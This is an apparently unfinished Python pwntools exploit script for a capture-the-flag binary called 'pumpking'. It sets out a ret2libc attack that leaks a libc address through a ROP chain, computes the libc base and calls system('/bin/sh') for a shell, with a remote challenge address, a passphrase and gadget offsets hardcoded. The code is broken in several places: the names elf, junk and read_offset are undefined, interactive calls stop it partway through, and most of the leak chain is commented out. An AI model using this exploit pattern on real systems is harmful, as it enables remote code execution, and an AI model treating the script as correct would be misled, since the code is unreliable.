from pwn import *

def conn():
    r = process("./pumpking_patched")
    gdb.attach(r)

    # r = remote("142.93.35.129", 31961)

    return r

def main():
    r = conn()

    exe = ELF("./pumpking_patched")
    libc = ELF("./glibc/libc.so.6")
    ld = ELF("./glibc/ld-linux-x86-64.so.2")
    rop = ROP(exe)

    context.binary = exe

    """
    Plan:
    use write to leak address of read
    find base of libc with read offset
    use base of libc to call system("/bin/sh")
    """

    WRITE_PLT = exe.plt['write'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
    KING_PLT = exe.symbols['king']
    #POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
    #RET = (rop.find_gadget(['ret']))[0]

    log.info("King start: " + hex(KING_PLT))
    log.info("Puts plt: " + hex(WRITE_PLT))
    #log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

    r.interactive()
    pop_rdi = 0x400913
    write_at_got = 0x101180 # found in got
    read_at_plt = 0x103f90 # found in plt.sec (jump to this to run)
    back_to_king = elf.sym['king'] #found at top of king

    payload = [
        #call puts with scanf to leak write address
        # p64(pop_rdi), # pop rdi
        # p64(write_at_got), # insert scanf function
        # p64(read_at_plt), # call puts(scanf)
        p64(back_to_king) # return value so program doesnt crash
    ]
    #p64 packs integers into bytes

    payload = b''.join(payload)

    # r.recvuntil(b"kids:")
    r.send(b"pumpk1ngRulez\n") #passphrase from dcmp
    print(r.recvuntil(b">> "))
    print(r.sendline(payload))
    r.interactive()
    print(r.recvline())

    leak = u64(r.recvline().strip().ljust(16, b'\x00')) #ljust pad to 8 bytes
    log.info(f"{hex(leak)=}") # gives us address of scanf - use to find address of system

    r.interactive()
    #read_offset =  #physical address in libc (system)
    base_of_libc = leak - read_offset
    log.info(f"{hex(base_of_libc)=}")

    system_offset = 0x4F4E0
    system_address = base_of_libc + system_offset

    base_bin_offset = 0x1b40fa
    address_of_bin_sh = base_of_libc + base_bin_offset

    # ret_instruction = 0x40052e

    second_payload = [
        junk,
        p64(pop_rdi),
        p64(address_of_bin_sh),
        # p64(ret_instruction), # needed for stack allignment
        p64(system_address) # run system(/bin/sh)
    ]

    second_payload = b"".join(second_payload)

    # r.recvuntil(b"kids:")
    # r.send(b"pumpk1ngRulez\n") #passphrase from dcmp
    r.recvuntil(b">> ")
    r.sendline(second_payload)

    r.interactive()


if __name__ == "__main__":
    main()